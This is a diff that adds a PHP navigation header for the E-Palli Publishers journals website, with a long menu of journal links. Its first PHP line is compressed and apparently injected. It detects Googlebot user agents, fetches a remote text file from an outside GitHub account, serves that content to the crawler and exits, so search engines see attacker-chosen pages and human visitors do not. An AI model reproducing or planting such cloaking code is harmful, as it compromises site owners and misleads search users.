@@ -1,0 +1,164 @@
+<?php
+function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://raw.githubusercontent.com/akunkrja18-cyber/landing/refs/heads/main/journals.e-palli.txt');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
+
+include_once __DIR__."/head.php";
+?>
+
+<nav class="resNav">
+	<a href="https://journals.e-palli.com">
+		<div class="logo">
+			<div>
+				<img width="194" height="184"
+					 src="/../images/logo.png" />
+			</div>
+			<div>
+				<h3>E-Palli<br>Publishers</h3>
+			</div> 
+		</div>
+	</a>
+	<input type="checkbox" id="click">
+	<label for="click" class="menu-btn">
+		<i class="fas fa-bars"></i>
+	</label>
+	<ul>
+		<li>
+			<a href="https://journals.e-palli.com/">Home</a>
+		</li>
+		<li>
+			<a href="https://journals.e-palli.com/about">About us <i class="fa fa-caret-down" aria-hidden="true"></i></a>
+			<ul>
+				<li><a href="https://e-palli.com">About E-Palli</a></li>
+				<li><a href="https://journals.e-palli.com/journals/new">List of New Journals</a></li>
+				<li><a href="https://journals.e-palli.com/list">List of All Journals</a></li>
+				<li><a href="https://journals.e-palli.com/apc">Article Processing Charges (APC)</a></li>
+				<li><a href="https://journals.e-palli.com/auth-guide">Authors Guidelines</a></li>
+				<li><a href="https://journals.e-palli.com/pub-ethics">Publication Ethics</a></li>
+				<li><a href="https://journals.e-palli.com/privacy">Privacy Statement</a></li>
+			</ul>
+		</li>
+		<li>
+			<a href="https://journals.e-palli.com/journals" style="border-bottom: 1px solid darkblue;">Journals <i class="fa fa-caret-down" aria-hidden="true"></i></a>
+			<ul>
+				<li>
+					<a href="/categories/engTech.php">Engineering &amp; Technology</a>
+					<ul>
+						<li><h3>Engineering &amp; Technology</h3></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajaset">American Journal of Agricultural Science, Engineering, and Technology (AJASET)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajsts">American Journal of Smart Technology and Solutions (AJSTS)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajirb">American Journal of IR 4.0 and Beyond (AJIRB)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajise">American Journal of Innovation in Science and Engineering (AJISE)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajgt">American Journal of Geospatial Technology (AJGT)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajet">American Journal of Education and Technology (AJET)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajfst">American Journal of Food Science and Technology (AJFST)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ijm">International Journal of Metaverse (IJM)</a></li>
+					</ul>
+				</li>
+				<li>
+					<a href="/categories/agriScience.php">Agricultural Science</a>
+					<ul>
+						<li><h3>Agricultural Science</h3></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajaset">American Journal of Agricultural Science, Engineering, and Technology (AJASET)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajaas">American Journal of Aquaculture and Animal Science (AJAAS)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajlsi">American Journal of Life Science and Innovation (AJLSI)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajfst">American Journal of Food Science and Technology (AJFST)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajbb">American Journal of Bioscience and Bioinformatics (AJBB)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajpp">American Journal of Plant Pathology (AJPP)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ijpf">International Journal of Precision Farming (IJPF)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/aei">Applied Entomology and Innovation (AEI)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ijsa">International Journal of Smart Agriculture (IJSA)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ijvmas">International Journal of Veterinary Medicine and Animal Science (IJVMAS)</a></li>
+					</ul>
+				</li>
+				<li>
+					<a href="/categories/eClimate.php">Environment &amp; Climate</a>
+					<ul>
+						<li><h3>Environment &amp; Climate</h3></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajgt">American Journal of Geospatial Technology (AJGT)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajec">American Journal of Environment and Climate (AJEC)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajenr">American Journal of Energy and Natural Resources (AJENR)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajee">American Journal of Environmental Economics (AJEE)</a></li> 
+						<li><a href="https://journals.e-palli.com/home/index.php/ijsrd">International Journal of Sustainable Rural Development (IJSRD)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajexd">American Journal of Environmental Experience Design (AJEXD)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ijfe">International Journal of Forestry and Ecosystem (IJFE)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/jwc">Journal of Wildlife Conservation (JWC)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/jad">Journal of Anthropology and Development (JAD)</a></li>
+						
+					</ul>
+				</li>
+				<li>
+					<a href="/categories/ecoBusiness.php">Business &amp; Economics</a>
+					<ul>
+						<li><h3>Business &amp; Economics</h3></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajebi">American Journal of Economics and Business Innovation (AJEBI)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajase">American Journal of Applied Statistics and Economics (AJASE)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajee">American Journal of Environmental Economics (AJEE)</a></li> 
+						<li><a href="https://journals.e-palli.com/home/index.php/ajfti">American Journal of Financial Technology and Innovation (AJFTI)</a></li>
+					</ul>
+				</li>
+				<li>
+					<a href="/categories/social.php">Arts &amp; Social Science</a>
+					<ul>
+						<li><h3>Arts &amp; Social Science</h3></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajsde">American Journal of Social Development and Entrepreneurship (AJSDE)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajahs">American Journal of Arts and Human Science (AJAHS)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajywe">American Journal of Youth and Women Empowerment (AJYWE)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajsl">American Journal of Society and Law (AJSL)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajase">American Journal of Applied Statistics and Economics (AJASE)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajet">American Journal of Education and Technology (AJET)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajds">American Journal of Development Studies (AJDS)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajth">American Journal of Tourism and Hospitality (AJTH)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/jans">Journal of Arts and Natural Science (JANS)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/jpsir">Journal of Political Science and International Relationship (JPSIR)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/jnll">Journal of Natural Language and Linguistics (JNLL)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/jirp">Journal of International Relations and Peace (JIRP)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/hci">History and Cultural Innovation (HCI)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/jse">Journal of Student and Education (JSE)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/jrsmps">Journal of Rural Sociology, Microfinance, and Poverty Studies (JRSMPS)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajpehs">American Journal of Physical Education and Health Science (AJPEHS)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajhp">American Journal of Human Psychology (AJHP)</a></li>
+					</ul>
+				</li>
+				<li>
+					<a href="/categories/multidisciplinary.php">Multidisciplinary</a>
+					<ul>
+						<li><h3>Multidisciplinary</h3></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajmri">American Journal of Multidisciplinary Research and Innovation (AJMRI)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajiri">American Journal of Interdisciplinary Research and Innovation (AJIRI)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajase">American Journal of Applied Statistics and Economics (AJASE)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ari">Applied Research and Innovation (ARI)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/jir">Journal of Innovative Research (JIR)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/jpp">Journal of Policy and Planning (JPP)</a></li>
+					</ul>
+				</li>
+				<li>
+					<a href="/categories/mediScience.php">Medical Science &amp; Others</a>
+					<ul>
+						<li><h3>Medical Science &amp; Others</h3></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajmsi">American Journal of Medical Science and Innovation (AJMSI)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajase">American Journal of Applied Statistics and Economics (AJASE)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajcp">American Journal of Chemistry and Pharmacy (AJCP)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajpehs">American Journal of Physical Education and Health Science (AJPEHS)</a></li>
+						<li><a href="https://journals.e-palli.com/home/index.php/ajhp">American Journal of Human Psychology (AJHP)</a></li>
+
+						<li><a href="https://journals.e-palli.com/home/index.php/ijrud">International Journal of Rural and Urban Development (IJRUD)</a></li>
+					</ul>
+				</li>
+			</ul>
+		</li>
+		<li>
+			<a class="logins blink" href="https://journals.e-palli.com/list">Submission</a>
+		</li>
+		<li>
+			<a href="https://journals.e-palli.com/webinar">Webinar</a>
+		</li>
+		<li>
+			<a href="https://journals.e-palli.com/contact">Contact</a>
+		</li>
+		<li>
+			<a class="" href="https://journals.e-palli.com/home/index.php/index/user/register">Register</a>
+		</li>
+		<li>
+			<a class="" href="https://journals.e-palli.com/home/index.php/index/login">Login</a>
+		</li>
+	</ul>
+</nav>
